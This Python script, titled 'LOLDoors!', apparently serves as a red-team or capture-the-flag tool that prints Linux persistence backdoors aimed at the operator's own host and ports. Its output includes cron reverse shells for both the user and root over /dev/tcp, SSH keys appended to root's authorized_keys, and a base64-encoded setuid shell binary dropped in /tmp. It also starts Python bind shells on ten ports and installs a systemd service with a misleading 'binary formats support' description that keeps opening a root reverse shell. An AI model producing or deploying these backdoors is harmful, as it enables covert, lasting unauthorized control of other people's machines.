#!/usr/bin/env python3

import os
import subprocess
import sys


# To-do: 
# New user (with ssh access)
# Fake revshell binary (curl?)


USER = os.getlogin()
LHOST = subprocess.check_output("ip a | grep -q tun0 && hostname -I || hostname -I | cut -d ' ' -f1", shell=True).decode('utf-8').strip()
LPORT = 20000
SSH_KEY =  subprocess.check_output(f"cat /home/{USER}/.ssh/id_rsa.pub", shell=True).decode('utf-8').strip()


if len(sys.argv) > 1:
    LHOST=sys.argv[1]
    LPORT=sys.argv[2]
    print(f"Setting up script with: \n---------------------\nIP ===> {LHOST} \nPORT ===> {LPORT}\n---------------------")
else:
    print(f"Setting up script default: \n---------------------\nIP ===> {LHOST} \nPORT ===> {LPORT}\n---------------------")

print("""
             LOLDoors!
            __________
           |  __  __  | 
           | |  ||  | |
           | |  ||  | |
           | |__||__| | 
           |  __  __()|
           | |  ||  | |
           | |  ||  | |
           | |  ||  | |
           | |  ||  | |
           | |__||__| |
           |__________|

""")

usrCronPORT = LPORT
sysCronPORT = LPORT + 1

pyBindPORT = LPORT + 10
badServicePORT = LPORT + 20


print(f"User Cronjob Port: {usrCronPORT}")
print(f"System Cronjob Port: {sysCronPORT}")
print(f"Bad Service Port: {badServicePORT}")

for i in range(pyBindPORT + 1, pyBindPORT + 10):
    print(f"Python Bind Shell Port: {i}")

print("-----------------------------------SCRIPT START-----------------------------------")

userCron = f'''((LPORT++)); crontab -l | {{ cat; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{LHOST}/{usrCronPORT} 0>&1'"; }} | crontab -'''
systemCron=f'''sudo bash -c "echo '* * * * * root bash -c \\"bash -i >& /dev/tcp/{LHOST}/{sysCronPORT} 0>&1\\"' >> /etc/crontab"'''
sshPersist = f"mkdir -p ~/.ssh; echo '{SSH_KEY}' >> ~/.ssh/authorized_keys; mkdir -p /root/.ssh; echo '{SSH_KEY}' >> /root/.ssh/authorized_keys"
filePrivEsc = 'echo "f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAABAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAAIAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F" | base64 -d >> /tmp/tmp && sudo chown root:root /tmp/tmp && sudo chmod +sx /tmp/tmp'

pyBind=f"""

LPORT={pyBindPORT}

file_location=/tmp/tmp.py
cat > $file_location <<EOF

import sys
import socket as s
import subprocess as sp

port = int(sys.argv[1])

s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
s1.bind(('0.0.0.0', port))
s1.listen(1)
c, a = s1.accept()

while True:
    d = c.recv(1024).decode()
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
    c.sendall(p.stdout.read() + p.stderr.read())

EOF

for p in {{1..10}}
do
((LPORT++))
python3 /tmp/tmp.py $LPORT & disown
done

"""

fakeService = f'''

sudo su

sudo mkdir /root/.binmft
file_location=/root/.binmft/binmft-support.sh
sudo cat > $file_location <<EOF
while :
do
        sleep 2
        sudo bash -c 'bash -i >& /dev/tcp/{LHOST}/{badServicePORT} 0>&1'
done
EOF
  sudo chmod +rwx  /root/.binmft/binmft-support.sh

  file_location=/etc/systemd/system/binmft-support.service

  sudo cat > $file_location <<EOF
[Unit]
Description=Enable support for additional executable binary formats
After=multi-user.target

[Service]
ExecStart=/usr/bin/bash /root/.binmft/binmft-support.sh
Type=simple

[Install]
WantedBy=multi-user.target

EOF

sudo systemctl enable  binmft-support.service
systemctl restart binmft-support.service
'''

print(pyBind)
print("\n"+sshPersist)
print("\n"+userCron)
print("\n"+systemCron)
print("\n"+filePrivEsc)
print("\n"+fakeService)

print("-----------------------------------SCRIPT END-----------------------------------")
